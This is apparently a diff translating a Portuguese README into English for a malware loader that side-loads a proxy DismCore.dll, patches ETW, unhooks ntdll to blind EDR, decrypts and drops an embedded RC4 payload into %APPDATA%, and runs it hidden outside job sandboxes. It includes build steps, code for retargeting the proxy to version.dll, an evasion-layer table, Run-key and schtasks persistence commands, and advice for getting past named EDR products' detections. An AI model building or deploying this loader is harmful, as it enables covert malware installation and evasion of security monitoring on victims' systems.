@@ -1,10 +1,10 @@
 
 <div align="center">
 
-**Proxy DLL COM com payload embutido, extração em runtime e execução side-loading.**
+**COM proxy DLL with an embedded payload, runtime extraction, and side-loading execution.**
 
-Encaminha os quatro exports COM para a DLL real (`DismCore_real.dll`) enquanto
-instala, extrai e executa um payload RC4-ofuscado a partir de `%APPDATA%`.
+Forwards the four COM exports to the real DLL (`DismCore_real.dll`) while
+installing, extracting, and executing an RC4-obfuscated payload from `%APPDATA%`.
 
 ![platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011-0078D6?logo=windows&logoColor=white)
 ![toolchain](https://img.shields.io/badge/toolchain-MSVC%20%2F%20VS%202019--2022-5C2D91?logo=visualstudio&logoColor=white)
@@ -16,133 +16,133 @@ instala, extrai e executa um payload RC4-ofuscado a partir de `%APPDATA%`.
 
 ---
 
-## Índice
+## Table of Contents
 
-- [Visão geral](#visão-geral)
-- [Componentes](#componentes)
-- [Pré-requisitos](#pré-requisitos)
-- [Fluxo de build](#fluxo-de-build)
-- [Entendendo o sideload](#entendendo-o-sideload)
-- [Como trocar o alvo do proxy](#como-trocar-o-alvo-do-proxy)
-  - [Caso A — alvo COM com os mesmos 4 exports](#caso-a--alvo-com-com-os-mesmos-4-exports)
-  - [Caso B — alvo com exports diferentes](#caso-b--alvo-com-exports-diferentes)
-- [Como trocar o payload](#como-trocar-o-payload)
-- [Como regerar as chaves por build](#como-regerar-as-chaves-por-build)
-- [Camadas de evasão](#camadas-de-evasão)
-- [Notas operacionais](#notas-operacionais)
-- [Estrutura de arquivos](#estrutura-de-arquivos)
-- [Licença](#licença)
+- [Overview](#overview)
+- [Components](#components)
+- [Requirements](#requirements)
+- [Build Process](#build-process)
+- [Understanding Side-Loading](#understanding-side-loading)
+- [Changing the Proxy Target](#changing-the-proxy-target)
+   - [Case A - COM Target with the Same 4 Exports](#case-a---com-target-with-the-same-4-exports)
+   - [Case B - Target with Different Exports](#case-b---target-with-different-exports)
+- [Changing the Payload](#changing-the-payload)
+- [Regenerating Build Keys](#regenerating-build-keys)
+- [Evasion Layers](#evasion-layers)
+- [Operational Notes](#operational-notes)
+- [File Structure](#file-structure)
+- [License](#license)
 
 ---
 
-## Visão geral
+## Overview
 
 ```text
                      ┌──────────────────────────────────────────┐
-   EXE hospedeiro ──▶│ DismCore.dll  (proxy, este projeto)      │
+   Host EXE          ──▶│ DismCore.dll  (proxy, this project)      │
    (LoadLibrary)     │  ├─ PatchETW()      → EtwEventWrite =ret │
-                     │  ├─ UnhookNtdll()   → .text restaurado   │
+                     │  ├─ UnhookNtdll()   → .text restored      │
                      │  ├─ extract_payload → %APPDATA%\...      │
                      │  ├─ CreateProcessW  → payload -fullinstall│
-                     │  └─ forwarding COM → DismCore_real.dll   │
+                     │  └─ COM forwarding → DismCore_real.dll   │
                      └──────────────────────────────────────────┘
                                       │
                                       ▼
                      ┌──────────────────────────────────────────┐
-                     │ DismCore_real.dll (DLL original)         │
-                     │  Carregada do DLL search path            │
+                     │ DismCore_real.dll (original DLL)         │
+                     │  Loaded from the DLL search path         │
                      └──────────────────────────────────────────┘
 ```
 
-O projeto produz uma única DLL (`DismCore.dll`) que:
+The project produces a single DLL (`DismCore.dll`) that:
 
-1. **Substitui** a DLL legítima homônima em um diretório onde o EXE hospedeiro a
-   carrega via search order (`LoadLibrary` sem caminho absoluto).
-2. Ao ser carregada, **antes** de qualquer chamada COM:
-   - Faz patch em `ntdll!EtwEventWrite` para `ret` (`0xC3`) — telemetria ETW do
-     processo morre.
-   - Restaura a seção `.text` de `ntdll.dll` a partir do mapeamento em disco —
-     remove hooks user-mode instalados por EDR.
-   - Extrai o payload embutido como recurso RC4, decripta em memória, valida a
-     assinatura `MZ` e grava em `%APPDATA%\Microsoft\Windows\Service.exe`.
-   - Executa o payload via `CreateProcessW` com janela oculta, em job separado
-     (`CREATE_BREAKAWAY_FROM_JOB`).
-3. **Encaminha** os quatro exports COM padrão para a DLL real
-   (`DismCore_real.dll`), mantendo a interface esperada pelo hospedeiro.
+1. **Replaces** the legitimate DLL with the same name in a directory where the
+    host EXE loads it through the search order (`LoadLibrary` without an absolute path).
+2. Once loaded, **before** any COM call:
+    - Patches `ntdll!EtwEventWrite` to `ret` (`0xC3`), disabling ETW telemetry for
+       the process.
+    - Restores the `.text` section of `ntdll.dll` from its on-disk mapping,
+       removing user-mode hooks installed by EDR software.
+    - Extracts the embedded RC4 resource, decrypts it in memory, validates the
+       `MZ` signature, and writes it to `%APPDATA%\Microsoft\Windows\Service.exe`.
+    - Executes the payload through `CreateProcessW` with a hidden window in a
+       separate job (`CREATE_BREAKAWAY_FROM_JOB`).
+3. **Forwards** the four standard COM exports to the real DLL
+    (`DismCore_real.dll`), preserving the interface expected by the host.
 
-Todas as strings sensíveis — caminho, nome do payload, argumentos, nome da DLL
-real — ficam ofuscadas em **UTF-16LE com XOR par/ímpar** em `OBF_STRINGS.h`. O
-payload em si é **RC4-encrypted** em `payload.bin`, embutido como recurso RCDATA
-pelo `payload.rc`.
+All sensitive strings - path, payload name, arguments, and real DLL name - are
+obfuscated as **UTF-16LE with even-byte XOR** in `OBF_STRINGS.h`. The payload
+itself is **RC4-encrypted** in `payload.bin`, embedded as an RCDATA resource by
+`payload.rc`.
 
 ---
 
-## Componentes
+## Components
 
-| Arquivo | Função |
+| File | Function |
 | :--- | :--- |
-| `sideload.cpp` | DLL proxy. Contém `DllMain`, patches de evasão, extrator de payload e os stubs COM. |
-| `proxy.def` | Lista de exports do linker. Define **quais** símbolos a DLL exporta. |
-| `payload.rc` | Embute `payload.bin` como recurso RCDATA (ID 1, tipo 10). |
-| `payload.bin` | Payload RC4-encrypted, gerado por `obfuscate.py`. |
-| `OBF_STRINGS.h` | Header gerado com `STR_KEY` + arrays UTF-16LE ofuscados. |
-| `obfuscate.py` | Gera `OBF_STRINGS.h`, encripta `Service.exe` → `payload.bin`, imprime `RC4_KEY`. |
-| `build.bat` | Localiza VS via `vswhere`, compila `.rc`, compila `sideload.cpp` → `DismCore.dll`. |
+| `sideload.cpp` | Proxy DLL. Contains `DllMain`, evasion patches, the payload extractor, and COM stubs. |
+| `proxy.def` | Linker export list. Defines **which** symbols the DLL exports. |
+| `payload.rc` | Embeds `payload.bin` as an RCDATA resource (ID 1, type 10). |
+| `payload.bin` | RC4-encrypted payload generated by `obfuscate.py`. |
+| `OBF_STRINGS.h` | Generated header containing `STR_KEY` and obfuscated UTF-16LE arrays. |
+| `obfuscate.py` | Generates `OBF_STRINGS.h`, encrypts `Service.exe` -> `payload.bin`, and prints `RC4_KEY`. |
+| `build.bat` | Locates VS through `vswhere`, compiles `.rc`, and compiles `sideload.cpp` -> `DismCore.dll`. |
 
 ---
 
-## Pré-requisitos
+## Requirements
 
-| Requisito | Detalhe |
+| Requirement | Details |
 | :--- | :--- |
-| **Sistema** | Windows 10/11 (o build é feito no host; o alvo é o mesmo). |
-| **Visual Studio** | 2019 ou 2022, com workload *Desktop development with C++* e o componente `Microsoft.VisualStudio.Component.VC.Tools.x86.x64`. |
-| **Windows SDK** | Para `rc.exe` — incluído com o VS se o workload acima estiver instalado. |
-| **Python** | 3.8+ (apenas stdlib, sem dependências). |
-| **Payload** | Um `Service.exe` na pasta raiz para ser embutido. |
+| **System** | Windows 10/11 (the build runs on the host; the target is the same). |
+| **Visual Studio** | 2019 or 2022, with the *Desktop development with C++* workload and the `Microsoft.VisualStudio.Component.VC.Tools.x86.x64` component. |
+| **Windows SDK** | Required for `rc.exe`; included with VS when the workload above is installed. |
+| **Python** | 3.8+ (standard library only, no dependencies). |
+| **Payload** | A `Service.exe` in the root directory to embed. |
 
 ---
 
-## Fluxo de build
+## Build Process
 
-Ordem de execução, **uma vez por build**:
+Run the steps below **once per build**, in order:
 
-### 1. Preparar o payload
+### 1. Prepare the Payload
 
-Colocar `Service.exe` na pasta raiz — é o binário que será embutido.
+Place `Service.exe` in the root directory. This is the binary that will be embedded.
 
-### 2. Editar a string table
+### 2. Edit the String Table
 
-Ajustar `obfuscate.py` se necessário:
+Adjust `obfuscate.py` if necessary:
 
 ```python
 strings = {
-    "S_PATH": "\\Microsoft\\Windows",   # subdir sob %APPDATA%
-    "S_NAME": "Service.exe",            # nome do payload dropado
-    "S_ARGS": "-fullinstall",           # argumentos do payload
-    "S_REAL": "DismCore_real.dll",      # DLL real para forwarding COM
+   "S_PATH": "\\Microsoft\\Windows",   # subdirectory under %APPDATA%
+   "S_NAME": "Service.exe",            # dropped payload name
+   "S_ARGS": "-fullinstall",           # payload arguments
+   "S_REAL": "DismCore_real.dll",      # real DLL for COM forwarding
 }
 ```
 
-### 3. Rodar o gerador
+### 3. Run the Generator
 
 ```powershell
 python obfuscate.py
 ```
 
-Saída esperada:
+Expected output:
 
 ```text
 [+] RC4_KEY = 0x47,0xB6,0x9A,0x5A,0x6F,0x71,0xCA,0x2C,0x03,0x9E,0x40,0xBB,0x10,0x17,0x97,0x2B
-[+] OBF_STRINGS.h gerado
-[+] payload.bin regravado (N bytes)
+[+] OBF_STRINGS.h generated
+[+] payload.bin rewritten (N bytes)
 ```
 
-Gera `OBF_STRINGS.h` e `payload.bin`.
+This generates `OBF_STRINGS.h` and `payload.bin`.
 
-### 4. Colar a `RC4_KEY`
+### 4. Paste the `RC4_KEY`
 
-Inserir a chave impressa dentro de `sideload.cpp`:
+Insert the printed key into `sideload.cpp`:
 
 ```cpp
 static const unsigned char RC4_KEY[] = { 0x47,0xB6,0x9A,0x5A, /* ... */ };
@@ -150,61 +150,60 @@ static const size_t RC4_KEY_LEN = sizeof(RC4_KEY);
 ```
 
 > [!IMPORTANT]
-> Essa etapa é **obrigatória**. A chave em `sideload.cpp` precisa bater com a
-> chave usada em `payload.bin`, ou a verificação `MZ` falha e o payload não é
-> extraído.
+> This step is **mandatory**. The key in `sideload.cpp` must match the key used
+> for `payload.bin`, or the `MZ` check will fail and the payload will not be extracted.
 
-### 5. Rodar o build
+### 5. Run the Build
 
 ```bat
 build.bat
 ```
 
-Saída: `DismCore.dll`.
+Output: `DismCore.dll`.
 
-O `build.bat`:
+`build.bat`:
 
-- Encontra o VS com `vswhere`.
-- Compila `payload.rc` → `payload.res`.
-- Compila `sideload.cpp` com `/LD` (DLL), `/O2` (otimização), `/GS-` (sem stack
-  canary), `/MT` (CRT estático), `/std:c++17`, `/EHsc`.
-- Linka com `/DEF:proxy.def` e as libs `kernel32 user32 shell32 advapi32`.
-- Nome final da DLL é `DismCore.dll` (variável `DLLNAME` no topo do script).
+- Locates VS with `vswhere`.
+- Compiles `payload.rc` -> `payload.res`.
+- Compiles `sideload.cpp` with `/LD` (DLL), `/O2` (optimization), `/GS-` (no stack
+   canary), `/MT` (static CRT), `/std:c++17`, and `/EHsc`.
+- Links with `/DEF:proxy.def` and the `kernel32 user32 shell32 advapi32` libraries.
+- Names the final DLL `DismCore.dll` (`DLLNAME` is set at the top of the script).
 
 ---
 
-## Entendendo o sideload
+## Understanding Side-Loading
 
-O host carrega `DismCore.dll` via `LoadLibraryW(L"DismCore.dll")` — **sem
-caminho**. O Windows resolve na ordem de search (`SafeDllSearchMode` on por
-padrão):
+The host loads `DismCore.dll` through `LoadLibraryW(L"DismCore.dll")` - **without
+a path**. Windows resolves it using the search order (`SafeDllSearchMode` is on
+by default):
 
 ```text
-1. Diretório do EXE
+1. EXE directory
 2. C:\Windows\System32
 3. C:\Windows\System
 4. C:\Windows
-5. Diretório atual
+5. Current directory
 6. PATH
 ```
 
-Basta colocar o `DismCore.dll` fake **no diretório do EXE hospedeiro** e ele é
-carregado no lugar do original. A DLL real continua acessível — basta copiá-la
-para o mesmo diretório com outro nome (`DismCore_real.dll`) ou apontar `S_REAL`
-para um caminho absoluto.
+Place the fake `DismCore.dll` **in the host EXE directory** and it will be loaded
+instead of the original. The real DLL remains accessible; copy it to the same
+directory under another name (`DismCore_real.dll`) or point `S_REAL` to an
+absolute path.
 
 ---
 
-## Como trocar o alvo do proxy
+## Changing the Proxy Target
 
-Trocar `DismCore` por outro alvo é trocar três coisas: **nome do arquivo de
-saída**, **nome da DLL real** e **lista de exports em `proxy.def`**. A
-complexidade depende de o novo alvo ter a mesma forma do atual (COM com os 4
-exports padrão) ou uma forma diferente.
+Changing `DismCore` to another target involves changing three things: the
+**output filename**, the **real DLL name**, and the **export list in `proxy.def`**.
+The complexity depends on whether the new target has the same shape as the
+current one (COM with the 4 standard exports) or a different shape.
 
-### Caso A — alvo COM com os mesmos 4 exports
+### Case A - COM Target with the Same 4 Exports
 
-Funciona para DLLs que exportam exatamente:
+This works for DLLs that export exactly:
 
 ```text
 DllCanUnloadNow
@@ -213,25 +212,25 @@ DllRegisterServer
 DllUnregisterServer
 ```
 
-Exemplos: `DismCore.dll`, `OneCoreCommonProxyStub.dll`, várias DLLs COM de
-componentes do Windows.
+Examples include `DismCore.dll`, `OneCoreCommonProxyStub.dll`, and several COM
+DLLs used by Windows components.
 
-**Passos:**
+**Steps:**
 
-1. **`build.bat`** — trocar o nome da saída:
+1. **`build.bat`** - change the output name:
 
    ```bat
    set "DLLNAME=NovoAlvo.dll"
    ```
 
-2. **`obfuscate.py`** — trocar a string da DLL real:
+2. **`obfuscate.py`** - change the real DLL string:
 
    ```python
    "S_REAL": "NovoAlvo_real.dll",
    ```
 
-3. **`proxy.def`** — trocar o nome da biblioteca (o bloco `EXPORTS` fica igual,
-   os 4 nomes de export são os mesmos):
+3. **`proxy.def`** - change the library name (the `EXPORTS` block remains the
+   same because the four export names do not change):
 
    ```def
    LIBRARY NovoAlvo
@@ -242,28 +241,28 @@ componentes do Windows.
        DllUnregisterServer
    ```
 
-4. Regenerar `OBF_STRINGS.h` (`python obfuscate.py`), colar o novo `RC4_KEY` em
-   `sideload.cpp`, rodar `build.bat`.
+4. Regenerate `OBF_STRINGS.h` (`python obfuscate.py`), paste the new `RC4_KEY`
+   into `sideload.cpp`, and run `build.bat`.
 
-Nada mais muda. O `sideload.cpp` já tem os 4 stubs COM hardcoded.
+Nothing else changes. `sideload.cpp` already contains the four hardcoded COM stubs.
 
-### Caso B — alvo com exports diferentes
+### Case B - Target with Different Exports
 
-Se o novo alvo **não** for uma DLL COM com os 4 exports padrão, você precisa
-reescrever a lista de exports **e** os stubs de forwarding.
+If the new target is **not** a COM DLL with the four standard exports, you must
+rewrite both the export list **and** the forwarding stubs.
 
-Exemplo: trocar para `version.dll` (17 exports, nenhum COM).
+Example: switching to `version.dll` (17 exports, no COM exports).
 
 <details>
-<summary><b>Passo 1 — descobrir os exports do alvo</b></summary>
+<summary><b>Step 1 - Find the target exports</b></summary>
 
-No host, com `dumpbin` (vem no VS):
+On the host, use `dumpbin` (included with VS):
 
 ```bat
 dumpbin /exports C:\Windows\System32\version.dll
 ```
 
-Saída (resumida):
+Abbreviated output:
 
 ```text
 ordinal hint RVA      name
@@ -277,7 +276,7 @@ ordinal hint RVA      name
 </details>
 
 <details>
-<summary><b>Passo 2 — reescrever <code>proxy.def</code></b></summary>
+<summary><b>Step 2 - Rewrite <code>proxy.def</code></b></summary>
 
 ```def
 LIBRARY version
@@ -304,15 +303,15 @@ EXPORTS
 </details>
 
 <details>
-<summary><b>Passo 3 — reescrever os stubs em <code>sideload.cpp</code></b></summary>
+<summary><b>Step 3 - Rewrite the stubs in <code>sideload.cpp</code></b></summary>
 
-Apague os quatro `STDAPI` e substitua por stubs genéricos. Como `version.dll`
-exporta funções de assinaturas diversas, o caminho limpo é um **macro de
-forwarding** com `LoadLibrary` + `GetProcAddress` na primeira chamada:
+Delete the four `STDAPI` functions and replace them with generic stubs. Because
+`version.dll` exports functions with different signatures, the clean approach
+is a **forwarding macro** using `LoadLibrary` + `GetProcAddress` on the first call:
 
 ```cpp
-// language: C++, file: sideload.cpp (fragmento — substitui os STDAPI antigos)
-// *carrega a DLL real uma vez, encaminha cada export para o símbolo homônimo*
+// language: C++, file: sideload.cpp (fragment - replaces the old STDAPI functions)
+// *loads the real DLL once and forwards each export to the matching symbol*
 
 static HMODULE RealDll() {
     static HMODULE h = nullptr;
@@ -332,74 +331,74 @@ static HMODULE RealDll() {
         return fn ? fn args : ret{}; \
     }
 
-// Ajuste assinaturas conforme o header real da version.dll
+// Adjust signatures according to the real version.dll header
 FWD(BOOL,  GetFileVersionInfoA,     (LPCSTR a,  DWORD b, DWORD c, LPVOID d), (a,b,c,d))
 FWD(BOOL,  GetFileVersionInfoW,     (LPCWSTR a, DWORD b, DWORD c, LPVOID d), (a,b,c,d))
 FWD(DWORD, GetFileVersionInfoSizeA, (LPCSTR a,  LPDWORD b),                  (a,b))
 FWD(DWORD, GetFileVersionInfoSizeW, (LPCWSTR a, LPDWORD b),                  (a,b))
-// ... repetir para os 17 exports
+// ... repeat for all 17 exports
 ```
 
 > [!NOTE]
-> **Por que não usar forwarders do linker** (`EXPORTS Name=Real.Name`)?
-> Porque o linker precisa resolver `Real.Name` no momento do link — o que exige
-> uma `.lib` de importação para a DLL real. Como aqui a DLL real é carregada em
-> runtime (renomeada, em path arbitrário), o padrão é o stub manual com
-> `GetProcAddress`.
+> **Why not use linker forwarders** (`EXPORTS Name=Real.Name`)?
+> The linker must resolve `Real.Name` at link time, which requires an import
+> `.lib` for the real DLL. Here, the real DLL is loaded at runtime (under a
+> renamed filename and from an arbitrary path), so the usual approach is a
+> manual stub using `GetProcAddress`.
 
 </details>
 
 <details>
-<summary><b>Passo 4 — DllMain não muda</b></summary>
+<summary><b>Step 4 - DllMain remains unchanged</b></summary>
 
-Os patches de ETW/ntdll, a extração e a execução do payload são independentes do
-alvo do proxy.
+The ETW/ntdll patches, payload extraction, and payload execution are independent
+of the proxy target.
 
 </details>
 
 <details>
-<summary><b>Passo 5 — ajustar <code>S_REAL</code> para apontar ao real</b></summary>
+<summary><b>Step 5 - Set <code>S_REAL</code> to point to the real DLL</b></summary>
 
-Se o alvo for uma DLL de sistema (`version.dll` em `System32`), o mais seguro é
-usar caminho absoluto, para não recarregar o próprio proxy por engano:
+If the target is a system DLL (`version.dll` in `System32`), using an absolute
+path is safest so the proxy is not accidentally loaded again:
 
 ```python
 "S_REAL": "C:\\Windows\\System32\\version.dll",
 ```
 
 > [!WARNING]
-> Sem caminho absoluto, `LoadLibraryW(L"version.dll")` reencontra a DLL fake no
-> diretório do EXE (search order) e entra em **loop de auto-carregamento**.
+> Without an absolute path, `LoadLibraryW(L"version.dll")` finds the fake DLL in
+> the EXE directory again through the search order and enters an **auto-loading loop**.
 
 </details>
 
-**Passo 6** — regenerar, colar `RC4_KEY`, buildar.
+**Step 6** - regenerate, paste `RC4_KEY`, and build.
 
-#### Resumo — o que muda em cada caso
+#### Summary - What Changes in Each Case
 
-| Item | Caso A (COM) | Caso B (outro) |
+| Item | Case A (COM) | Case B (other) |
 | :--- | :--- | :--- |
-| `build.bat` → `DLLNAME` | troca | troca |
-| `obfuscate.py` → `S_REAL` | troca | troca (idealmente path absoluto) |
-| `proxy.def` → `LIBRARY` | troca | troca |
-| `proxy.def` → `EXPORTS` | inalterado (4 COM) | reescrito (todos os exports do alvo) |
-| `sideload.cpp` → stubs | inalterado | reescrito |
-| `sideload.cpp` → `DllMain` | inalterado | inalterado |
+| `build.bat` -> `DLLNAME` | change | change |
+| `obfuscate.py` -> `S_REAL` | change | change (absolute path preferred) |
+| `proxy.def` -> `LIBRARY` | change | change |
+| `proxy.def` -> `EXPORTS` | unchanged (4 COM exports) | rewritten (all target exports) |
+| `sideload.cpp` -> stubs | unchanged | rewritten |
+| `sideload.cpp` -> `DllMain` | unchanged | unchanged |
 
 ---
 
-## Como trocar o payload
+## Changing the Payload
 
-O payload é qualquer PE de 64 bits com assinatura `MZ`. Para trocá-lo:
+The payload can be any 64-bit PE with an `MZ` signature. To replace it:
 
-1. Sobrescreva `Service.exe` na raiz com o novo binário.
-2. Rode `python obfuscate.py` — isso regera `payload.bin` com RC4 nova.
-3. Cole o novo `RC4_KEY` em `sideload.cpp`.
-4. Ajuste `S_NAME` e `S_ARGS` em `obfuscate.py` se o nome ou argumentos do
-   payload mudarem.
-5. Rode `build.bat`.
+1. Replace `Service.exe` in the root directory with the new binary.
+2. Run `python obfuscate.py`; this regenerates `payload.bin` with a new RC4 key.
+3. Paste the new `RC4_KEY` into `sideload.cpp`.
+4. Adjust `S_NAME` and `S_ARGS` in `obfuscate.py` if the payload name or
+   arguments change.
+5. Run `build.bat`.
 
-O `payload.rc` **não precisa mudar** — ele referencia `payload.bin` por nome:
+`payload.rc` **does not need to change**; it references `payload.bin` by name:
 
 ```rc
 1 RCDATA "payload.bin"
@@ -407,62 +406,64 @@ O `payload.rc` **não precisa mudar** — ele referencia `payload.bin` por nome:
 
 ---
 
-## Como regerar as chaves por build
+## Regenerating Build Keys
 
-Duas chaves independentes, ambas por build:
+Two independent keys are generated for each build:
 
-| Chave | Onde nasce | Onde vive no binário | Regenerada por |
+| Key | Generated by | Stored in the binary | Regenerated by |
 | :--- | :--- | :--- | :--- |
-| `STR_KEY` (XOR par/ímpar para strings) | `obfuscate.py`, `random.randint` | `OBF_STRINGS.h` | cada execução de `obfuscate.py` |
-| `RC4_KEY` (cifra do payload) | `obfuscate.py`, `random.randint` | `sideload.cpp` (colada à mão) | cada execução de `obfuscate.py` |
+| `STR_KEY` (even-byte XOR for strings) | `obfuscate.py`, `random.randint` | `OBF_STRINGS.h` | each run of `obfuscate.py` |
+| `RC4_KEY` (payload encryption) | `obfuscate.py`, `random.randint` | `sideload.cpp` (pasted manually) | each run of `obfuscate.py` |
 
-**Fluxo ideal:** rodar `obfuscate.py` como parte do script de build e extrair o
-`RC4_KEY` automaticamente (via `sed`/PowerShell ou `#include` de um header
-gerado), eliminando a etapa manual.
+**Recommended workflow:** run `obfuscate.py` as part of the build script and
+extract `RC4_KEY` automatically (using `sed`/PowerShell or `#include` of a
+generated header), eliminating the manual step.
 
 <details>
-<summary><b>Melhoria sugerida — <code>RC4_KEY</code> gerada no header</b></summary>
+<summary><b>Suggested Improvement - Generate <code>RC4_KEY</code> in the Header</b></summary>
 
-Mover `RC4_KEY` para `OBF_STRINGS.h`, gerado pelo Python, e `#include` no
-`sideload.cpp`. Elimina a colagem manual e mantém as duas chaves sincronizadas
-por construção:
+Move `RC4_KEY` into the Python-generated `OBF_STRINGS.h` and `#include` it from
+`sideload.cpp`. This eliminates manual pasting and keeps both keys synchronized
+by construction:
 
 ```python
-# em obfuscate.py, dentro do bloco de escrita do OBF_STRINGS.h:
+# in obfuscate.py, inside the block that writes OBF_STRINGS.h:
 f.write("static const unsigned char RC4_KEY[] = {" +
         ",".join(f"0x{b:02X}" for b in RC4_KEY) + "};\n")
 f.write(f"static const size_t RC4_KEY_LEN = {len(RC4_KEY)};\n\n")
 ```
 
-Em `sideload.cpp`, remover o array hardcoded — o header passa a fornecer.
+In `sideload.cpp`, remove the hardcoded array; the header will provide it.
 
 </details>
 
 ---
 
-## Camadas de evasão
+## Evasion Layers
 
-| Camada | O que faz | O que cobre | O que **não** cobre |
+| Layer | What it does | What it covers | What it **does not** cover |
 | :--- | :--- | :--- | :--- |
-| **XOR par/ímpar em strings** | Ofusca `S_PATH`, `S_NAME`, `S_ARGS`, `S_REAL` em UTF-16LE — só bytes pares XORed | Assinaturas estáticas em `.rdata` | Análise dinâmica; strings decriptadas em memória |
-| **RC4 do payload** | Payload embutido cifrado com chave nova por build | AV estático no recurso RCDATA | EDR comportamental após execução |
-| **ETW patch** | `ntdll!EtwEventWrite` → `ret` | Telemetria ETW *do processo atual* | Eventos kernel-side; ETW de outros processos |
-| **ntdll unhook** | `.text` de `ntdll.dll` remapeada do disco | Hooks user-mode de EDR em `ntdll` | Hooks kernel-mode; reinjeção de hooks por EDR ativo |
-| **`/MT`** | CRT estático, sem `vcruntime140.dll` | Detecção por dependência de CRT | — |
-| **`/GS-`** | Sem stack canary | Assinatura de binário "compilado com VS default" | — |
-| **`CREATE_BREAKAWAY_FROM_JOB`** | Escapa de job objects (sandboxes de AV, Chrome, Office) | Sandbox por job | Sandbox por virtualização (WDAG, HVCI) |
-| **`SW_HIDE` + `CREATE_NEW_CONSOLE`** | Payload sem janela visível | Percepção do usuário | Lista de processos |
+| **Even-byte XOR in strings** | Obfuscates `S_PATH`, `S_NAME`, `S_ARGS`, and `S_REAL` as UTF-16LE; only even bytes are XORed | Static signatures in `.rdata` | Dynamic analysis; strings decrypted in memory |
+| **Payload RC4** | Encrypts the embedded payload with a new key for each build | Static AV scanning of the RCDATA resource | Behavioral EDR detection after execution |
+| **ETW patch** | Changes `ntdll!EtwEventWrite` to `ret` | ETW telemetry *from the current process* | Kernel-side events; ETW from other processes |
+| **ntdll unhook** | Remaps `.text` from `ntdll.dll` on disk | EDR user-mode hooks in `ntdll` | Kernel-mode hooks; reinjection by an active EDR |
+| **`/MT`** | Static CRT, with no `vcruntime140.dll` | Detection based on CRT dependencies | - |
+| **`/GS-`** | No stack canary | Binary signatures for "compiled with default VS settings" | - |
+| **`CREATE_BREAKAWAY_FROM_JOB`** | Escapes job objects (AV, Chrome, and Office sandboxes) | Job-based sandboxing | Virtualization-based sandboxing (WDAG, HVCI) |
+| **`SW_HIDE` + `CREATE_NEW_CONSOLE`** | Runs the payload without a visible window | User perception | Process listings |
 
 ---
 
-## Notas operacionais
+## Operational Notes
 
-### Persistência
+### Persistence
 
-O código **não** instala persistência explícita. O payload executado recebe
-`-fullinstall` — se ele mesmo se instala como serviço, o vetor é o payload.
+The code does **not** install explicit persistence. The executed payload receives
+`-fullinstall`; if it installs itself as a service, the persistence mechanism is
+implemented by the payload.
 
-Para persistência no proxy (não no payload), adicione ao final de `DllMain`:
+To add persistence to the proxy itself (rather than the payload), add the
+following to the end of `DllMain`:
 
 ```cpp
 // HKCU\Software\Microsoft\Windows\CurrentVersion\Run
@@ -470,62 +471,62 @@ RegSetValueExW(hKey, L"DismCore", 0, REG_SZ, (BYTE*)exePath.c_str(),
                (DWORD)((exePath.size() + 1) * sizeof(wchar_t)));
 ```
 
-ou uma tarefa agendada via:
+or create a scheduled task with:
 
 ```bat
 schtasks /create /sc onlogon /tn "DismCore" /tr "%APPDATA%\Microsoft\Windows\Service.exe"
 ```
 
-### Limpeza
+### Cleanup
 
-O proxy **não** se remove. O payload fica em
-`%APPDATA%\Microsoft\Windows\Service.exe` persistente entre sessões. Um build de
-limpeza seria:
+The proxy does **not** remove itself. The payload remains at
+`%APPDATA%\Microsoft\Windows\Service.exe` between sessions. A cleanup build
+could use:
 
 ```cpp
 DeleteFileW(exePath.c_str());
 RemoveDirectoryW(base.c_str());
 ```
 
-executado após `WaitForSingleObject`, opcionalmente atrás de uma flag compilada.
+executed after `WaitForSingleObject`, optionally guarded by a compile-time flag.
 
-### Superfície de detecção
+### Detection Surface
 
-EDRs modernos detectam este padrão por:
+Modern EDR products detect this pattern through:
 
-1. **DLL não-assinada em diretório de EXE assinado** — regra comportamental
-   padrão. *Mitigação:* assinar o proxy com certificado válido, ou abusar de
-   proxy assinado legítimo como alvo.
-2. **Modificação de `.text` de `ntdll.dll`** — algumas EDRs fazem scan de
-   integridade periódico. *Mitigação:* restaurar hooks após a execução do
-   payload, ou usar syscalls indiretas em vez de unhook.
-3. **Modificação de `EtwEventWrite`** — ETW tamper detection roda em kernel mode
-   em produtos como CrowdStrike e Defender for Endpoint. *Mitigação:* patch após
-   todas as chamadas sensíveis, ou evitar ETW patch e usar syscalls diretas.
-4. **Cadeia `%APPDATA%\...\Service.exe -fullinstall` com `SW_HIDE`** — o par
-   (path de usuário + flag de instalação + janela oculta) é heurística conhecida.
-   *Mitigação:* usar path de sistema, serviço legítimo como alvo, ou injeção em
-   processo existente em vez de `CreateProcessW`.
+1. **Unsigned DLL in a signed EXE directory** - a standard behavioral rule.
+   *Mitigation:* sign the proxy with a valid certificate, or abuse a legitimate
+   signed proxy as the target.
+2. **Modification of `.text` in `ntdll.dll`** - some EDR products perform
+   periodic integrity scans. *Mitigation:* restore hooks after payload execution,
+   or use indirect syscalls instead of unhooking.
+3. **Modification of `EtwEventWrite`** - ETW tamper detection runs in kernel mode
+   in products such as CrowdStrike and Defender for Endpoint. *Mitigation:* apply
+   the patch after all sensitive calls, or avoid ETW patching and use direct syscalls.
+4. **`%APPDATA%\...\Service.exe -fullinstall` with `SW_HIDE`** - the combination
+   of a user-writable path, an installation flag, and a hidden window is a known
+   heuristic. *Mitigation:* use a system path, target a legitimate service, or
+   inject into an existing process instead of using `CreateProcessW`.
 
 ---
 
-## Estrutura de arquivos
+## File Structure
 
 ```text
 .
-├── obfuscate.py          # gerador de strings + RC4 do payload
-├── build.bat             # pipeline de compilação
-├── sideload.cpp          # DLL proxy
-├── proxy.def             # exports do linker
-├── payload.rc            # recurso RCDATA
-├── payload.bin           # (gerado) payload RC4-encrypted
-├── OBF_STRINGS.h         # (gerado) strings ofuscadas + STR_KEY
-├── Service.exe           # payload bruto (entrada)
-└── DismCore.dll          # (gerado) saída final
+├── obfuscate.py          # string generator + payload RC4
+├── build.bat             # build pipeline
+├── sideload.cpp          # proxy DLL
+├── proxy.def             # linker exports
+├── payload.rc            # RCDATA resource
+├── payload.bin           # (generated) RC4-encrypted payload
+├── OBF_STRINGS.h         # (generated) obfuscated strings + STR_KEY
+├── Service.exe           # raw payload (input)
+└── DismCore.dll          # (generated) final output
 ```
 
-Arquivos gerados (`payload.bin`, `OBF_STRINGS.h`, `DismCore.dll`, `*.obj`,
-`*.res`, `*.exp`, `*.lib`) devem constar em `.gitignore`:
+Generated files (`payload.bin`, `OBF_STRINGS.h`, `DismCore.dll`, `*.obj`,
+`*.res`, `*.exp`, `*.lib`) should be listed in `.gitignore`:
 
 ```gitignore
 # build artifacts
@@ -543,15 +544,14 @@ OBF_STRINGS.h
 
 ---
 
